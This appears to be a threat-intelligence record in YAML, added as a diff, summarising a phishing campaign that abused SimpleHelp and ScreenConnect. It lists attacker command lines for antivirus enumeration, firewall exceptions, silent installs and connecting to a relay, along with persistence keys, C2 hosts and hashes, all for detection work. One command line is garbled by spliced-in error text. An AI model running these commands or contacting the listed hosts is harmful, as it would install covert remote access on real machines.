@@ -1,0 +1,223 @@
+title: 'VENOMOUS#HELPER: Dual-RMM Phishing Campaign Leveraging JWrapper-Packaged SimpleHelp
+  and ScreenConnect for Silent Remote Access'
+description: The report details the behavior of a JWrapper-based remote access malware
+  that uses Java components and specific command lines to establish persistence and
+  perform network communications.
+attribution: ''
+malware_families:
+- SimpleHelp RAT
+- JWrapper-Remote Access
+- JWrapper Remote Access
+cves: []
+ttps:
+  processes:
+  - SimpleService.exe
+  - SimpleGatewayService.exe
+  - session_win.exe
+  - elev_win.exe
+  - Remote Access.exe
+  - wmic.exe
+  - cmd.exe
+  - wmic.exe.bak
+  - cacls.exe
+  - msiexec.exe
+  - statement5648.exe
+  - services.exe
+  - netsh.exe
+  - rundll32.exe
+  - ScreenConnect.ClientService.exe
+  - ScreenConnect.WindowsClient.exe
+  - SecurityHealthSystray.exe
+  - explorer.exe
+  - unpack200.exe
+  - windowslauncher.exe
+  - winpty-agent64.exe
+  command_lines:
+  - C:\Windows\system32\cmd.exe /c C:\Windows\System32\wbem\wmic.exe.bak /namespace:\\root\SecurityCenter2
+    PATH AntiVirusProduct get-
+  - cmd.exe /c netsh advfirewall show all State
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\elev_win.exe
+    C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\jwrapper_utils.jar;C:\ProgramData\JWrapper-Remote
+    Access\JWrapper-Remote Access-00052861074-complete\customer.jar -Dsun.java2d.dpiaware=true
+    -Djava.library.path=C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete
+    com.aem.sdesktop.util.MouseMover 127.0.0.1 56936 127.0.0.1 56937 elevated
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\elev_win.exe
+    mouselocation
+  - cacls C:\ProgramData\JWrapper-Remote Access\Remote AccessWinLauncher.exe /e /g
+    Users:F
+  - cmd.exe /c C:\Windows\System32\wbem\wmic.exe.bak /namespace:\\root\SecurityCenter2
+    PATH FirewallProduct get
+  - netsh advfirewall show all State
+  - wmic.exe /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct get
+  - wmic.exe /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct get
+  - elev_win.exe C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\windowslauncher.exe
+    -cp C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\jwrapper_utils.jar;C:\ProgramData\JWrapper-Remote
+    Access\JWrapper-Remote Access-00052861074-complete\customer.jar -Dsun.java2d.dpiaware=true
+    -Djava.library.path=C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete
+    com.aem.sdesktop.util.MouseMover 127.0.0.1 56936 127.0.0.1 56937 elevated
+  - elev_win.exe mouselocation
+  - msiexec.exe /i sc.msi /qn
+  - msiexec.exe /V
+  - C:\Windows\syswow64\MsiExec.exe -Embedding 975E1E24ECB9F562B809F458594D14A3 E
+    Global\MSI0000
+  - netsh wlan show interfaces
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\java.exe
+    SHRemoteAccessServiceJE_2 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    Access.exe SHRemoteAccessServiceJE_4 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    AccessECompatibility.exe SHRemoteAccessServiceJE_5 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    AccessLauncher.exe SHRemoteAccessServiceJE_6 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\javaw.exe
+    SHRemoteAccessServiceJE_3 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\java-rmi.exe
+    SHRemoteAccessServiceJE_1 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\StopSimpleGatewayService.exe
+    SHRemoteAccessServiceSH_3_2 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\SimpleGatewayService.exe
+    SHRemoteAccessServiceSH_3_1 ENABLE
+  - netsh.exe firewall add allowedprogram C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\windowslauncher.exe
+    SHRemoteAccessServiceJE_7 ENABLE
+  - rundll32.exe C:\Windows\Installer\MSI4209.tmp,zzzzInvokeManagedCustomActionOutOfProc
+    SfxCA_56509750 2 ScreenConnect.InstallerActions!ScreenConnect.ClientInstallerActions.FixupServiceArguments
+  - ScreenConnect.ClientService.exe ?e=Access&y=Guest&h=sslzeromail[.]run.place&p=8041&s=1063c106-fb78-4a61-a1c3-959620aa0d1e&k=BgIAAACkAABSU0ExAAgAAAEAAQAtB7xpgSSY0vmCVpwxcuZIThe
+    system cannot find the file specified. fax8SzUK6ZHTngAMzp7yIqVypKK1lThe system
+    cannot find the file specified. bwoyeosThe system cannot find the file specified.
+    b5yThe system cannot find the file specified. fXThe system cannot find the file
+    specified. bEcYDldPOGOThe system cannot find the file specified. b3PseeSeaeo44ykXwdThe
+    system cannot find the file specified. blThe system cannot find the file specified.
+    fa8k24jRIn74Gp2The system cannot find the file specified. b6qNTThe system cannot
+    find the file specified. bpaZaHOThe system cannot find the file specified. fbUva6NBdH5pUcuaDkXzZywacRkvVQa8BOn3uumi7zc0IO44QZboES72PcThe
+    system cannot find the file specified. frxJcuAMThe system cannot find the file
+    specified. f65GGaOEJ4x8ilqcKaquAr0uKFGbaglfYDyCV8kqRaw2L1ucF3The system cannot
+    find the file specified. b22DuwyIwzXd5HwpBsq94euEbHbtNMk4QThe system cannot find
+    the file specified. fDThe system cannot find the file specified. fefxQBPwDqhjWThe
+    system cannot find the file specified. bW2NU99bR16tNqqMbeolXIToecThe system cannot
+    find the file specified. bB9CZ9abJuZES6ULML512IN3phqQZKv&t=&c=crypto&c=&c=&c=&c=&c=&c=&c=
+  - ScreenConnect.WindowsClient.exe RunRole 87140605-5d2c-4a7d-9c4a-781ac7f07691 System
+  - ScreenConnect.WindowsClient.exe RunRole 0d393de2-f5aa-4318-9563-b659faff1a49 System
+  - ScreenConnect.WindowsClient.exe RunRole 9dad62c5-42a7-4f31-b383-22ecbad23c7a System
+  - ScreenConnect.WindowsClient.exe RunRole 426d2985-183b-4d41-9abc-f24af794a2db User
+  - ScreenConnect.WindowsClient.exe RunRole f00ff167-e6f2-44ad-9ccb-e30f6906d0f2 System
+  - ScreenConnect.WindowsClient.exe RunRole 1c5eeb04-e194-44a1-b466-87bab51ce23f System
+  - ScreenConnect.WindowsClient.exe RunRole add529c0-e532-4f23-84dd-6671686c303e System
+  - SecurityHealthSystray.exe
+  - session_win.exe slWaitForCompletion C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote
+    Access-00052861074-complete\elev_win.exe mouselocation
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\SimpleGatewayService.exe
+    -uninstall C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\simplegateway.service
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\SimpleGatewayService.exe
+    -install C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\simplegateway.service
+  - wmic.exe /namespace:\\root\SecurityCenter2 PATH FirewallProduct get
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\windowslauncher.exe
+    -cp C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\customer.jar;C:\ProgramData\JWrapper-Remote
+    Access\JWrapper-Remote Access-00052861074-complete\jwrapper_utils.jar -Dsun.java2d.dpiaware=true
+    -Djava.library.path=C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete
+    com.aem.sdesktop.util.MouseMover 127.0.0.1 56940 127.0.0.1 56941 elevated_backup
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\bin\unpack200.exe
+    C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\jaccess.jar.p2
+    C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\jaccess.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\windowslauncher.exe
+    -Xshare:dump
+  powershell: []
+  scripts: []
+  registry_keys:
+  - HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Remote Access Service
+  image_loads:
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\jaccess.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\rt.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\jsse.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\access-bridge-64.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\sunec.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\alt-rt.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\sunmscapi.jar
+  network_connections:
+  - SimpleGatewayService.exe -> 84.200.205[.]233:5555
+  - SimpleGatewayService.exe -> sslzeromail[.]run.place:8041
+  - Remote Access.exe -> gruta[.]com.mx:80
+  - Remote Access.exe -> server.cubatiendaalimentos[.]com.mx/~tiendazoycom/sns/statement5648.exe:80
+  - SimpleHelp updater/download endpoint -> 84.200.205[.]233:5555
+  - ScreenConnect relay URI -> sslzeromail[.]run.place:8041
+  - Remote Access.exe -> sslzeromail[.]run.place:8041
+  - statement5648.exe -> 127.0.0.1:56940
+  - statement5648.exe -> 127.0.0.1:56941
+  file_activity:
+  - C:\ProgramData\JWrapper-Remote Access\
+  - C:\Windows\System32\wbem\wmic.exe.bak
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\sgalive
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\session_win.exe
+  - C:\ProgramData\JWrapper-Remote Access\Remote AccessWinLauncher.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\windowslauncher.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\jwrapper_utils.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access-00052861074-complete\customer.jar
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\java.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    Access.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    AccessECompatibility.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\Remote
+    AccessLauncher.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\javaw.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWrapper-Windows64JRE-00052234686-complete\bin\java-rmi.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\StopSimpleGatewayService.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\SimpleGatewayService.exe
+  - C:\Windows\Installer\MSI4209.tmp
+  - C:\Program Files (x86)\ScreenConnect Client (adbce2b92cb435b3)\ScreenConnect.ClientService.exe
+  - C:\Program Files (x86)\ScreenConnect Client (adbce2b92cb435b3)\ScreenConnect.WindowsClient.exe
+  - C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService\simplegateway.service
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\jaccess.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\rt.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\jsse.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\access-bridge-64.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\sunec.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\alt-rt.jar.p2
+  - C:\ProgramData\JWrapper-Remote Access\JWrapperTemp-1777396455-7-app\lib\ext\sunmscapi.jar.p2
+  persistence:
+  - Windows SCM service + SafeBoot registry key pointing to SimpleService.exe with
+    the service config file as its argument
+  - Liveness Watchdog: Monitors the file C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\sgalive.
+      If the RAT process fails to update this file, SimpleService.exe automatically
+      restarts it.
+  - Windows service named "Remote Access Service"
+  - Safe Mode persistence via HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Remote
+    Access Service
+  - Registry Run key (HKCU) pointing to C:\ProgramData\JWrapper-Remote Access\JWAppsSharedConfig\SimpleGatewayService.exe
+  process_relations:
+  - SimpleService.exe -> SimpleGatewayService.exe
+  - session_win.exe -> elev_win.exe
+  - Remote Access.exe -> cacls.exe
+  - Remote Access Monitoring.exe -> cacls.exe
+  - statement5648.exe -> cacls.exe
+  - Remote AccessLauncher.exe -> cacls.exe
+  - wmic.exe -> cmd.exe
+  - elev_win.exe -> session_win.exe
+iocs:
+  hashes:
+  - 810a99a7d6696a36491530e286476b4cf8a819a47fb5e3801fdfecfdb2dc6193
+  - 641230a9f3091bdd38d04c6df96062bfc82dfc4ff6f663ceb522d3881d6af53a
+  - dbdddea03c3fc4c2574ce4221450ec86221ebc615c4915c4c4eb3f2a5e3f5b25
+  - 9369d7194ab03362e9e7af022a48bc6d4e7d91a6ab7c4b5cf5d90abbcd8c7012
+  - 97f801e750cfc2d4558020fb246782e034fd6101d75a59d8915b4f2b2b50ebd9
+  - 11914d10b51b5a96606ae606b5ab70d79550e36c1cce94a86134107c59075e0c
+  - 76d85124db2778baecee24cc5ad56c9a3060c41c5b3c1b5cdc7f0435e0f77cac
+  - d953dfbe8d91dc9fafad0a6117e1276fa636d4ae1b6a4d81616ff2446cf09234
+  - 3e4b3559fdbe584e19a1ff9b3142b429c6fb91aaa63b5c922c8c5b32c38e426a
+  ip_addresses:
+  - 84.200.205[.]233
+  - 213.136.71.246
+  - 213.136.71[.]246
+  domains:
+  - gruta[.]com.mx
+  - server.cubatiendaalimentos[.]com[.]mx
+  - sslzeromail[.]run.place
+  - server.cubatiendaalimentos[.]com.mx
+  urls:
+  - http[:]//84.200.205[.]233:5555/access/
+authors:
+- Akshay Gaikwad
+- Shikha Sangwan
+- Aaron Beardslee
+reference: https://www.securonix.com/blog/venomous-helper-phishing-campaign
+date_of_publication: May 09, 2026
+file_creation_date: May 09, 2026
